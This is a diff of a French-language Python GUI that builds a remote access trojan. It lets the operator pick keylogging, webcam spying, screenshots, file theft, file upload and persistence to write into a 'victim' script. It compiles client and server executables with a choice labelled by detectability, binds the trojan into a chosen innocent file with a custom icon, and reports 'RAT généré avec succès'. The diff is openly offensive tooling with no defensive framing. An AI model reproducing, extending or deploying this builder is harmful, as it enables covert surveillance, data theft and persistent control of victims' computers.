         port = self.controller.user_choices.get("port")
-        # Description et liste d'options avec des cases à cocher
+        # Description et liste d'options avec des cases a cocher
         self.options = {
             "Keylogger": "Enregistre toutes les frappes du clavier.",
             "Ouvrir la webcam": "Active la webcam pour espionner.",
-            "Capture d'écran": "Prend des captures d'écran à intervalles réguliers.",
-            "Récupération des fichiers": "Télécharge les fichiers spécifiques depuis la cible.",
+            "Capture d'ecran": "Prend des captures d'ecran a intervalles reguliers.",
+            "Recuperation des fichiers": "Telecharge les fichiers specifiques depuis la cible.",
             "Transmettre des fichiers": "Permet d'envoyer des fichiers vers la cible.",
-            "Persistance": "Implémente la persistance pour maintenir l'accès.",
-            "Surveillance du microphone": "Écoute via le microphone.",
+            "Persistance": "Implemente la persistance pour maintenir l'acces.",
             
         }
 
@@ -969,7 +1238,7 @@ class OptionsPage(CenteredFrame):
             checkbox.pack(anchor="w", pady=5)
             self.selected_options[option] = var
 
-        self.description_label = ctk.CTkLabel(self.inner_frame, text="Sélectionnez une option pour voir sa description.",
+        self.description_label = ctk.CTkLabel(self.inner_frame, text="Selectionnez une option pour voir sa description.",
                                               font=("Arial", 14), text_color="gray")
         self.description_label.pack(pady=15)
 
@@ -977,35 +1246,35 @@ class OptionsPage(CenteredFrame):
         button_frame = ctk.CTkFrame(self.inner_frame)
         button_frame.pack(fill="x", pady=20)
 
-        ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
+        ctk.CTkButton(button_frame, text="Precedent", font=("Arial", 16),
                       command=lambda: controller.show_page("NetworkSettingsPage")).pack(side="left", padx=10)
 
-        # Créer un bouton qui appelle la méthode handle_button_click
+        # Creer un bouton qui appelle la methode handle_button_click
         ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
                       command=lambda:[self.save_and_create_file(), controller.show_page("FileSelectionPage") ]).pack(side="right", padx=20)
 
     def show_description(self, option, description):
-        """Affiche la description de l'option sélectionnée."""
+        """Affiche la description de l'option selectionnee."""
         self.description_label.configure(text=f"{option} : {description}")
 
         
     def save_and_create_file(self):
         selected = [option for option, var in self.selected_options.items() if var.get()]
         if not selected:
-            messagebox.showwarning("Avertissement", "Veuillez sélectionner au moins une option.")
+            messagebox.showwarning("Avertissement", "Veuillez selectionner au moins une option.")
             return
         create_victim_script1()
         NetworkSettingsPage.recup_ip_port(self.controller.user_choices)
         add_code_to_victim_script2()
-        # Ajouter le code correspondant aux options sélectionnées dans victim.py
+        # Ajouter le code correspondant aux options selectionnees dans victim.py
         for option in selected:
             if option == "Keylogger":
                 self.add_keylogger_code_to_victim_script()
             elif option == "Ouvrir la webcam":
                 self.add_camera_code_to_victim_script()
-            elif option == "Capture d'écran":
+            elif option == "Capture d'ecran":
                 self.add_screenshot_code_to_victim_script()
-            elif option == "Récupération des fichiers":
+            elif option == "Recuperation des fichiers":
                 self.add_download_code_to_victim_script()
             elif option == "Transmettre des fichiers":
                 self.add_upload_code_to_victim_script()
@@ -1084,20 +1353,35 @@ class FileSelectionPage(CenteredFrame):
         super().__init__(parent)
         self.controller = controller
 
+        # Titre de la page
         ctk.CTkLabel(self.inner_frame, text="Sélectionner un fichier pour l'injection",
                      font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)
 
+        # Label pour afficher le fichier sélectionné
         self.file_label = ctk.CTkLabel(self.inner_frame, text="Aucun fichier sélectionné",
                                        font=("Arial", 16), text_color="gray")
         self.file_label.pack(pady=10)
 
-        # Menu déroulant et bouton pour sélectionner un fichier
-        ctk.CTkLabel(self.inner_frame, text="Choisir l'extension :", font=("Arial", 14)).pack(pady=10)
-        
-
+        # Bouton pour choisir un fichier
         ctk.CTkButton(self.inner_frame, text="Choisir un fichier", font=("Arial", 16),
                       command=self.choose_file).pack(pady=10)
 
+        # Frame pour la sélection de l'outil de génération
+        tool_frame = ctk.CTkFrame(self.inner_frame)
+        tool_frame.pack(fill="x", pady=20)
+
+        ctk.CTkLabel(tool_frame, text="Choisissez un outil pour générer l'exécutable :",
+                     font=("Arial", 16)).pack(pady=10)
+
+        # Option pour choisir entre Nuitka et PyInstaller
+        self.tool_var = ctk.StringVar(value="Nuitka")  # Valeur par défaut
+        
+        ctk.CTkRadioButton(tool_frame, text="Lent et moins detectable", variable=self.tool_var, value="Nuitka",
+                           font=("Arial", 14)).pack(pady=5)
+        
+        ctk.CTkRadioButton(tool_frame, text="Rapide et plus detectable ", variable=self.tool_var, value="PyInstaller",
+                           font=("Arial", 14)).pack(pady=5)
+      
         # Boutons de navigation
         button_frame = ctk.CTkFrame(self.inner_frame)
         button_frame.pack(fill="x", pady=20)
@@ -1105,10 +1389,15 @@ class FileSelectionPage(CenteredFrame):
         ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
                       command=lambda: controller.show_page("OptionsPage")).pack(side="left", padx=10)
         ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
-                      command=self.save_and_next).pack(side="right", padx=10),
+                      command=self.save_and_next).pack(side="right", padx=10)
         
 
     def save_and_next(self):
+        if not self.controller.user_choices["file_to_inject"]:
+            messagebox.showwarning("Avertissement", "Veuillez selectionner le fichier a injecter.")
+            return
+        selected_tool = self.tool_var.get()
+        self.controller.user_choices["choix-exe"] = selected_tool
         self.controller.show_page("OutputPage")
         
     
@@ -1116,7 +1405,7 @@ class FileSelectionPage(CenteredFrame):
         file_path = filedialog.askopenfilename(title="Choisir un fichier")
         if file_path:
             self.controller.user_choices["file_to_inject"] = file_path
-            self.file_label.configure(text=f"Fichier sélectionné : {file_path}", text_color="white")
+            self.file_label.configure(text=f"Fichier selectionne : {file_path}", text_color="white")
 
 
 
@@ -1125,11 +1414,11 @@ class NetworkSettingsPage(CenteredFrame):
         super().__init__(parent)
         self.controller = controller
 
-        ctk.CTkLabel(self.inner_frame, text="Paramètres Réseau",
+        ctk.CTkLabel(self.inner_frame, text="Parametres Reseau",
                      font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)
 
         # Adresse IP
-        ctk.CTkLabel(self.inner_frame, text="Adresse IP :", font=("Arial", 14)).pack(pady=5)
+        ctk.CTkLabel(self.inner_frame, text="Adresse IP(local : si l'attaque est dans le meme lan , public : si t'utilse un cloud)", font=("Arial", 14)).pack(pady=5)
         self.ip_entry = ctk.CTkEntry(self.inner_frame, placeholder_text="127.0.0.1")
         self.ip_entry.insert(0, self.controller.user_choices["ip_address"])
         self.ip_entry.pack(pady=5)
@@ -1140,13 +1429,17 @@ class NetworkSettingsPage(CenteredFrame):
         self.port_entry.insert(0, str(self.controller.user_choices["port"]))
         self.port_entry.pack(pady=5)
 
-       
+       # Adresse IP
+        ctk.CTkLabel(self.inner_frame, text="Adresse IP local :", font=("Arial", 14)).pack(pady=5)
+        self.ip2_entry = ctk.CTkEntry(self.inner_frame, placeholder_text="127.0.0.1")
+        self.ip2_entry.insert(0, self.controller.user_choices["ip_address2"])
+        self.ip2_entry.pack(pady=5)
        
         # Boutons de navigation
         button_frame = ctk.CTkFrame(self.inner_frame)
         button_frame.pack(fill="x", pady=20)
 
-        ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
+        ctk.CTkButton(button_frame, text="Precedent", font=("Arial", 16),
                       command=lambda: controller.show_page("IntroductionPage")).pack(side="left", padx=10)
 
         ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
@@ -1157,6 +1450,7 @@ class NetworkSettingsPage(CenteredFrame):
 
     def save_and_next(self):
         self.controller.user_choices["ip_address"] = self.ip_entry.get()
+        self.controller.user_choices["ip_address2"] = self.ip2_entry.get()
         self.controller.user_choices["port"] = int(self.port_entry.get())
         self.controller.show_page("OptionsPage")
         
@@ -1164,32 +1458,48 @@ class NetworkSettingsPage(CenteredFrame):
     def recup_ip_port(controller_user_choices):
         ip_address = controller_user_choices.get("ip_address")
         port = controller_user_choices.get("port")
-        
         if ip_address and port:
             add_ip_and_port_to_victim_script(ip_address, port)
         else:
-            print("IP ou Port non définis.")
+            print("IP ou Port non definis.")
         
+
     @staticmethod
     def recup_ip_port2(controller_user_choices):
-        ip_address = controller_user_choices.get("ip_address")
         port = controller_user_choices.get("port")
-        
-        if ip_address and port:
-            create_server_2(ip_address, port)
+        ip_address2 = controller_user_choices.get("ip_address2")
+        if ip_address2 and port:
+            create_server_2(ip_address2, port)
         else:
-            print("IP ou Port non définis.")
+            print("IP ou Port non definis.")
 
 
-class WaitingPage(ctk.CTkToplevel):
-    def __init__(self, parent, message="Veuillez patienter..."):
+class WaitingPage(CenteredFrame):
+    def __init__(self, parent, controller):
         super().__init__(parent)
-        self.geometry("300x100")
-        self.title("En attente")
-        self.resizable(False, False)
-        self.label = ctk.CTkLabel(self, text=message, font=("Arial", 16))
+        self.controller = controller
+
+        # Label principal
+        self.label = ctk.CTkLabel(self.inner_frame, text="Veuillez patienter...", font=("Arial", 24, "bold"), text_color="lightblue")
         self.label.pack(pady=20)
-        self.protocol("WM_DELETE_WINDOW", lambda: None)  # Désactiver la fermeture
+
+        # Barre de progression
+        self.progress_bar = CTkProgressBar(self.inner_frame, mode="indeterminate")  # Mode indéterminé pour une animation continue
+        self.progress_bar.pack(pady=20)
+
+        # Démarrer l'animation de la barre de progression
+        self.start_animation()
+
+    def start_animation(self):
+        """Démarre l'animation de la barre de progression."""
+        self.progress_bar.start()  # Démarre l'animation de la barre de progression
+        self.running = True
+
+    def stop_animation(self):
+        """Arrête l'animation de la barre de progression."""
+        self.running = False
+        self.progress_bar.stop()  # Arrête l'animation de la barre de progression
+        
 
 class OutputPage(CenteredFrame):
     def __init__(self, parent, controller):
@@ -1199,13 +1509,13 @@ class OutputPage(CenteredFrame):
         ctk.CTkLabel(self.inner_frame, text="Emplacement de stockage",
                      font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)
 
-        self.output_label = ctk.CTkLabel(self.inner_frame, text="Aucun emplacement sélectionné",
+        self.output_label = ctk.CTkLabel(self.inner_frame, text="Aucun emplacement selectionne",
                                          font=("Arial", 16), text_color="gray")
         self.output_label.pack(pady=10)
 
         ctk.CTkButton(self.inner_frame, text="Choisir un emplacement", font=("Arial", 16),
                       command=self.choose_output).pack(pady=10)
-        self.icon_label = ctk.CTkLabel(self.inner_frame, text="Aucune icône sélectionné",
+        self.icon_label = ctk.CTkLabel(self.inner_frame, text="Aucune icône selectionne",
                                          font=("Arial", 16), text_color="gray")
         self.icon_label.pack(pady=10)
         ctk.CTkButton(self.inner_frame, text="Choisir une icône", font=("Arial", 16),
@@ -1215,31 +1525,31 @@ class OutputPage(CenteredFrame):
         button_frame = ctk.CTkFrame(self.inner_frame)
         button_frame.pack(fill="x", pady=20)
 
-        ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
+        ctk.CTkButton(button_frame, text="Precedent", font=("Arial", 16),
                       command=lambda: controller.show_page("FileSelectionPage")).pack(side="left", padx=10)
 
-        ctk.CTkButton(button_frame, text="Générer", font=("Arial", 16),
+        ctk.CTkButton(button_frame, text="Generer", font=("Arial", 16),
                       command=self.save_and_next).pack(side="right", padx=10)
 
     def choose_output(self):
         output_path = filedialog.askdirectory(title="Choisir un emplacement de stockage")
         if output_path:
             self.controller.user_choices["output_path"] = output_path
-            self.output_label.configure(text=f"Emplacement sélectionné : {output_path}", text_color="white")
+            self.output_label.configure(text=f"Emplacement selectionne : {output_path}", text_color="white")
 
     def choose_icon(self):
-        # Ouvre une boîte de dialogue pour sélectionner une icône (fichier .ico).
+        # Ouvre une boite de dialogue pour selectionner une icône (fichier .ico).
         file_path = filedialog.askopenfilename(
             title="Choisir une icône",
             filetypes=[("Fichiers d'icônes", "*.ico"), ("Tous les fichiers", "*.*")]
         )
         if file_path:
             self.controller.user_choices["icon_path"] = file_path  # Stocke le chemin dans user_choices
-            self.icon_label.configure(text=f"Icône sélectionnée : {file_path}", text_color="white")
+            self.icon_label.configure(text=f"Icône selectionnee : {file_path}", text_color="white")
     
     def generate_rat(self):
         if not self.controller.user_choices["output_path"]:
-            messagebox.showwarning("Avertissement", "Veuillez sélectionner un emplacement de stockage.")
+            messagebox.showwarning("Avertissement", "Veuillez selectionner un emplacement de stockage.")
             return
 
         options = ", ".join(self.controller.user_choices["options"])
@@ -1248,51 +1558,63 @@ class OutputPage(CenteredFrame):
         output_path = self.controller.user_choices["output_path"]
         ip_address = self.controller.user_choices["ip_address"]
         port = self.controller.user_choices["port"]
-        encryption_method = self.controller.user_choices["encryption_method"]
 
         messagebox.showinfo(
-            "Succès",
-            f"RAT généré avec succès !\n\nOptions : {options}\nExtension : {extension}\n"
-            f"Fichier injecté : {file_to_inject}\nIP : {ip_address}\nPort : {port}\n"
-            f"Méthode de chiffrement : {encryption_method}\nStocké dans : {output_path}"
+            "Succes",
+            f"RAT genere avec succes !\n\nOptions : {options}\nExtension : {extension}\n"
+            f"Fichier injecte : {file_to_inject}\nIP : {ip_address}\nPort : {port}\n"
+            f"Stocke dans : {output_path}"
         )
 
+   
+
     def save_and_next(self):
-        # Crée et affiche une fenêtre d'attente
-        waiting_window = WaitingPage(self, message="Génération en cours, veuillez patienter...")
-        
-        # Fonction exécutée dans un thread
+        # Passer a la page WaitingPage
+        if not self.controller.user_choices["output_path"]:
+            messagebox.showwarning("Avertissement", "Veuillez selectionner le chemin de stockage.")
+            return
+        if not self.controller.user_choices["icon_path"]:
+            messagebox.showwarning("Avertissement", "Veuillez selectionner une icone.")
+            return
+        self.controller.show_page("WaitingPage")
+
+        # Lancer la tache en arriere-plan
         def background_task():
             try:
                 current_dir = os.path.dirname(__file__)
                 input_file = os.path.join(current_dir, "client1.py")
                 exe_name = "client1.exe"
-                create_exe_with_nuitka(input_file, exe_name)
+                if(self.controller.user_choices["choix-exe"] == "Nuitka"):
+                    create_exe_with_nuitka(input_file, exe_name)
+                else: create_exe_with_pyinstaller(input_file, exe_name)    
                 time.sleep(3)
 
                 input_file1 = os.path.join(current_dir, "server1.py")
                 exe_name1 = "server1.exe"
-                create_exe_with_nuitka(input_file1, exe_name1)
+                if(self.controller.user_choices["choix-exe"] == "Nuitka"):
+                    create_exe_with_nuitka(input_file1, exe_name1)
+                else: create_exe_with_pyinstaller(input_file1, exe_name1)    
                 time.sleep(3)
 
                 client_path = os.path.join(current_dir, "client1.exe")
+                
                 bind_files(self.controller.user_choices["file_to_inject"], client_path,
                            self.controller.user_choices["icon_path"], self.controller.user_choices["output_path"])
+                           
+                
+                self.controller.show_page("OutputPage")
 
-                # Générer le message de succès
+                # Generer le message de succes
                 self.generate_rat()
 
             except Exception as main_error:
                 print(f"Error: {main_error}")
                 messagebox.showerror("Erreur", f"Une erreur s'est produite : {main_error}")
-            
-            finally:
-                waiting_window.destroy()  # Fermer la fenêtre d'attente
 
+            self.controller.show_page("OutputPage")
         # Lancer le thread
         thread = threading.Thread(target=background_task)
         thread.start()
-
 
 if __name__ == "__main__":
     app = Application()
